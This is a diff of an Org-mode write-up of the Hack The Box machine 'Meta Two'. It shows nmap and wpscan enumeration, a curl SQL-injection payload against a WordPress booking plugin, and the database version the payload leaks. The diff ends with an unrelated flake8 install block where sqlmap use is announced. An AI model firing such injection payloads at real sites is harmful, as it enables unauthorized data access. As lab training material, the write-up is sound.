@@ -1,4 +1,5 @@
 #+title: Meta Two
+#+result: output
 
 ** Connection and nmap
 First we connect to the openvpn that HTB provides us and spin the machine
@@ -8,7 +9,9 @@ Then we will use nmap, as usual for enumeration:
 sudo nmap -sC -sV -T4 10.10.11.186
 #+end_src
 
-The options are the usual:
+#+RESULTS:
+
+The options are following:
 -sC: to use the default scripts
 -sV: probes the open ports for system information
 -T4: to define the aggressiveness of the scan
@@ -22,20 +25,27 @@ we can try other things such as connecting through ftp:
 #+begin_src sh
 ftp 10.10.11.186
 #+end_src
+
+#+RESULTS:
+
 and trying to log as anonymous. This does not work.
 
 So we are left with the http service which we know that is nginx/1.18.0 and the
 hostname is http://metapress.htb/.
 
-We then have to go to /etc/hosts and append the ip and hostname using any text editor
+We then have to go to /etc/hosts and append the ip and hostname using any text
+editor.
 This allows us to open the hostname in the browser without any problem.
 
 Of course this is true for Linux (which you probably should be using), in Windows is
 a little more complicated and I struggled to be able to do this the first time. I
 tried to change the host file in System32, then flush the dns and nothing worked.
-Finally I simply installed firefox in WSL2 Kali and I use VcXsrv to all GUI apps.
+Finally I simply installed firefox in WSL2 Kali and I use VcXsrv to view all GUI
+apps.
 
 One way or another we should be able to browse the page now.
+
+** Looking for vulnerabilities
 
 We can look at the source code and it does not seem to be leaking any credentials
 but we can see it's a Wordpress site. We can play around with the forms and
@@ -46,9 +56,7 @@ security.
 wpscan --url http://metapress.htb
 #+end_src
 
-There is a lot of information there but the first thing that catches the eye is
-the fact that is telling us that the version of Wordpress (5.6.2) is identified
-as insecure. So we will look for the vulnerabilities associated with this version.
+#+RESULTS:
 
 You can look them up in https://wpscan.com/wordpress/562 and go through each of
 them but if we go back to the source code of the events page we can see that is
@@ -58,6 +66,10 @@ the curl command that is provided we can see that is taking advantage of
 Wordpress nonces, which we can look in the source code such as the one in the
 generateSpamCatcha function.
 
+There is a lot of information there but the first thing that catches the eye is
+the fact that is telling us that the version of Wordpress (5.6.2) is identified
+as insecure. So we will look for the vulnerabilities associated with this version.
+
 So the command we have to use would look like something like this:
 #+begin_src sh
 curl -i 'http://metapress.htb.com/wp-admin/admin-ajax.php'--data
@@ -65,6 +77,9 @@ curl -i 'http://metapress.htb.com/wp-admin/admin-ajax.php'--data
 UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,-5,-5,-5,-5,-5,-5--
 -'
 #+end_src
+
+#+RESULTS:
+
 You should replace the nonce with the one that you can find in the source code, and the output will be like this:
 
 #+begin_quote
@@ -84,3 +99,28 @@ Referrer-Policy: strict-origin-when-cross-origin
 
 [{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
 #+end_quote
+
+Now we can use sqlmap, which is a tool for automating the process of detecting
+and exploiting SQL injection vulnerabilities. We can use it to identify the
+database management system, enumerate databases, tables and columns, extract the
+data and even run commands.
+
+#+begin_src sh :exports code
+pip install --upgrade flake8
+#+end_src
+
+#+RESULTS:
+| Defaulting   | to                          | user                                    | installation         | because        | normal                                        | site-packages | is      | not     | writeable |
+| Collecting   | flake8                      |                                         |                      |                |                                               |               |         |         |           |
+| Using        | cached                      | flake8-6.0.0-py2.py3-none-any.whl       | (57                  | kB)            |                                               |               |         |         |           |
+| Collecting   | pycodestyle<2.11.0,>=2.10.0 |                                         |                      |                |                                               |               |         |         |           |
+| Using        | cached                      | pycodestyle-2.10.0-py2.py3-none-any.whl | (41                  | kB)            |                                               |               |         |         |           |
+| Collecting   | pyflakes<3.1.0,>=3.0.0      |                                         |                      |                |                                               |               |         |         |           |
+| Using        | cached                      | pyflakes-3.0.1-py2.py3-none-any.whl     | (62                  | kB)            |                                               |               |         |         |           |
+| Requirement  | already                     | satisfied:                              | mccabe<0.8.0,>=0.7.0 | in             | /home/fede/.local/lib/python3.8/site-packages | (from         | flake8) | (0.7.0) |           |
+| Installing   | collected                   | packages:                               | pyflakes,            | pycodestyle,   | flake8                                        |               |         |         |           |
+| Attempting   | uninstall:                  | pyflakes                                |                      |                |                                               |               |         |         |           |
+| Found        | existing                    | installation:                           | pyflakes             | 2.4.0          |                                               |               |         |         |           |
+| Uninstalling | pyflakes-2.4.0:             |                                         |                      |                |                                               |               |         |         |           |
+| Successfully | uninstalled                 | pyflakes-2.4.0                          |                      |                |                                               |               |         |         |           |
+| Successfully | installed                   | flake8-6.0.0                            | pycodestyle-2.10.0   | pyflakes-3.0.1 |                                               |               |         |         |           |
